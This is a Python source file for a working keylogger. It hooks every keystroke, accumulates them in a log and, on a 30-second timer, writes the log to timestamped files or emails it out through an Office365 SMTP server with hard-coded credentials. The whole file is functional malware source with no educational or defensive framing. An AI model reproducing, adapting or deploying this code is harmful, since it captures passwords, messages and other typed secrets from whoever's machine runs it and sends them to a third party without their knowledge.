import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

reportInterval = 30  # Reporting interval in seconds
emailUser = "user@mail.me"   # Change to your mail id
emailPass = "password"       # Change to your respective password

class KeyLogger:
    def __init__(self, interval, reportMethod="email"):
        self.interval = interval
        self.reportMethod = reportMethod
        self.log = ""
        self.startTime = datetime.now()
        self.endTime = datetime.now()

    def handleKeyEvent(self, event):
        # Capture and format the keystroke
        key = event.name
        if len(key) > 1:
            key = {"space": " ",
                   "enter": "[ENTER]\n",
                   "decimal": "."
                }.get(key, f"[{key.upper()}]")
        self.log += key

    def generateFilename(self):
        # Create a unique filename based on timestamps
        startStr = self.startTime.strftime("%Y-%m-%d_%H%M%S")
        endStr = self.endTime.strftime("%Y-%m-%d_%H%M%S")
        return f"keylog_{startStr}_{endStr}.txt"

    def saveLogToFile(self):
        filename = self.generateFilename()
        with open(filename, "w") as file:
            file.write(self.log)
        print(f"[+] Log saved to {filename}")

    def composeEmail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = emailUser
        msg["To"] = emailUser
        msg["Subject"] = "Keylogger Report"
        msg.attach(MIMEText(message, "plain"))
        msg.attach(MIMEText(f"<p>{message}</p>", "html"))
        return msg.as_string()

    def sendEmail(self, message):
        try:
            with smtplib.SMTP("smtp.office365.com", 587) as server:
                server.starttls()
                server.login(emailUser, emailPass)
                server.sendmail(emailUser, emailUser, self.composeEmail(message))
            print(f"[+] Email sent to {emailUser}")
        except Exception as e:
            print(f"[-] Email sending failed: {e}")

    def report(self):
        if self.log:
            self.endTime = datetime.now()
            if self.reportMethod == "email":
                self.sendEmail(self.log)
            elif self.reportMethod == "file":
                self.saveLogToFile()
            self.startTime = datetime.now()
            self.log = ""
        timer = Timer(self.interval, self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.startTime = datetime.now()
        keyboard.on_release(callback=self.handleKeyEvent)
        self.report()
        print(f"[+] Keylogger started at {self.startTime}")
        keyboard.wait()

if __name__ == "__main__":
    keylogger = KeyLogger(interval=reportInterval, reportMethod="file")
    keylogger.start()
